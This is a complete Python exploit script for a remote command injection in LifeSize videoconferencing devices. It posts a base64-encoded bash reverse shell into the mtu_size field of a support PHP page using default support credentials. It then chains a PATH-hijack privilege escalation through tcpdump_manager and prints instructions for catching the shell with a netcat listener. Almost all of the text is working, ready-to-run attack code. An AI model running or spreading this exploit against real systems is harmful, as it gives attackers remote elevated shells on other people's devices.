import requests
from requests.auth import HTTPBasicAuth
from multiprocessing import Process
import sys

#ignore ssl warnings
requests.packages.urllib3.disable_warnings()


print "LifeSize Team/Room/Passport/Networker Remote Command Injection Exploit \n"
print "This PoC sends a reverse shell, start a netcat listener to catch it (nc -lvp 81) \n"
print "Usage: LargerThanLife.py lifesize_ip listener_ip listener_port \n"

life_ip = sys.argv[1]
lis_ip = sys.argv[2]
lis_port = sys.argv[3]

#basic reverse shell payload
pay = 'bash -i >& /dev/tcp/' + lis_ip + '/' + lis_port + ' 0>&1'

#base64 encode the payload
pay2 = pay.encode('base64')

#.encode('base64') add another char in the end for some reason, lets remove it 
pay2 = pay2[:-1]

#final payload levereging LPE from https://github.com/XiphosResearch/exploits/tree/master/deathsize
#without it our shell will have apache permissions
payload = '1;cd /tmp && echo ' + pay2 + ' | openssl enc -base64 -d >reset_tcpdump && chmod 755 reset_tcpdump && PATH=.:$PATH tcpdump_manager'

#Vulnerable php file
url = 'https://' + life_ip + '/support/mtusize.php'

#sending the request, shell should pop in any second
r = requests.post(url , verify=False , auth=HTTPBasicAuth('cli', 'lifesize'), data = {'mtu_size':payload})
if r.status_code != 200:
	print "something went wrong, like wrong user:pass for support panel"
else:
	print "check your listener for a shell"
